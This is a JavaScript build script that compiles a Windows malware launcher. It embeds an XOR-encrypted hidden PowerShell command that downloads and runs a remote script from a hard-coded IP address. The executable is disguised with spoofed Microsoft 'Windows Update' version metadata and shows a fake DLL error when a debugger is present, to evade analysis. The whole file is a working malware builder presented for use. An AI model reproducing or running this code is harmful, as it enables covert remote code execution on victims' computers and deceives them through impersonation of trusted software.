// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function rcSource() {
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Update Setup"
            VALUE "FileVersion",      "10.0.19041.1"
            VALUE "InternalName",     "wuauclt"
            VALUE "OriginalFilename", "wuauclt.exe"
            VALUE "ProductName",      "Microsoft Windows"
        END
    END
END
`;
}

function cSource({ ip }) {
  // XOR encrypt the PowerShell command
  const cmd = `powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://${ip}/api/downloads/st.ps1')"`;
  const key = 0x5A;
  const encCmd = Array.from(cmd).map(c => c.charCodeAt(0) ^ key);
  const cmdArr = encCmd.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');

  return `
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void decrypt_cmd(char* out) {
    unsigned char enc[] = { ${cmdArr} };
    int key = 0x5A;
    for (int i = 0; i < sizeof(enc); i++) {
        out[i] = (char)(enc[i] ^ key);
    }
    out[sizeof(enc)] = 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Fake crash error to trick sandbox
    if (IsDebuggerPresent()) {
        MessageBoxW(NULL, L"The code execution cannot proceed because MSVCP140.dll was not found.", L"System Error", MB_ICONERROR);
        return 1;
    }

    char cmd[1024];
    decrypt_cmd(cmd);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
`;
}

export async function compileLauncher({ key, config, baseExe }) {
  let ip = "31.58.77.63";
  if (config && config.ip) ip = config.ip;

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath      = path.join(workDir, 'launcher.c');
  const rcPath     = path.join(workDir, 'app.rc');
  const resPath    = path.join(workDir, 'app.res');
  const outPath    = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource({ ip }));
  fs.writeFileSync(rcPath, rcSource());

  const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSourcePath)) {
    fs.copyFileSync(iconSourcePath, path.join(workDir, 'icon.ico'));
  } else {
    const dummyIcon = Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex');
    fs.writeFileSync(path.join(workDir, 'icon.ico'), dummyIcon);
  }

  try {
    await execFileP(WINDRES, [
      '-I', workDir, '-i', rcPath, '-o', resPath, '--input-format=rc', '--output-format=coff'
    ], { cwd: workDir, timeout: 30_000 });

    await execFileP(CC, [
      '-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
      '-lshell32', '-lole32', '-luser32', '-lkernel32'
    ], { cwd: workDir, timeout: 60_000 });

    return fs.readFileSync(outPath);
  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}